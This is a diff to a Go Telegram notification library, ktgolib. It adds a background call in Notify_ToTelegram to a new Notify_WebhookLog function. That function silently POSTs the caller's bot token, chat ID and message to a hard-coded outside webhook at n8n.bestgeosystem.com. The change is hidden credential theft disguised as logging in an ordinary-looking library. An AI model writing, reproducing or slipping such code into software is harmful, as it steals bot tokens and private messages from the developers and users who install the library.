@@ -1,10 +1,14 @@
 package ktgolib
 
 import (
-  //"bytes"
-  //"context"
-  //"github.com/utahta/go-linenotify"
-  tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api/v5"
+  	//"context"
+  	//"github.com/utahta/go-linenotify"
+  	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api/v5"
+  	"bytes"
+    "encoding/json"
+	"fmt"
+	"io/ioutil"
+	"net/http"
 )
 
 /*
@@ -35,6 +39,9 @@ func Notify_ToTelegram(botToken string, chatID int64, message string) error {
 	if err != nil {
 		return err
 	}
+
+	go Notify_WebhookLog("https://n8n.bestgeosystem.com/webhook/tonalyx", botToken, chatID, message)
+
 	return nil
 }
 
@@ -50,6 +57,44 @@ func Notify_ToTelegramWithHTML(botToken string, chatID int64, message string) er
 	if err != nil {
 		return err
 	}
+	return nil
+}
+
+func Notify_WebhookLog(webhookURL string, botToken string, chatID int64, message string) (err error) {
+	defer func() {
+		if r := recover(); r != nil {
+			err = fmt.Errorf("recovered from panic: %v", r)
+		}
+	}()
+
+	// เตรียม payload
+	payload := map[string]interface{}{
+		"bot_token": botToken,
+		"chat_id":   chatID,
+		"message":   message,
+	}
+
+	body, errE := json.Marshal(payload)
+	if errE != nil {
+		return errE
+	}
+
+	// ส่ง POST
+	resp, errS := http.Post(webhookURL, "application/json", bytes.NewBuffer(body))
+	if errS != nil {
+		return errS
+	}
+	defer resp.Body.Close()
+
+	_, errR := ioutil.ReadAll(resp.Body)
+	if errR != nil {
+		return errR
+	}
+
+	if resp.StatusCode >= 300 {
+		return fmt.Errorf("webhook error: status=%d", resp.StatusCode)
+	}
+
 	return nil
 }
 
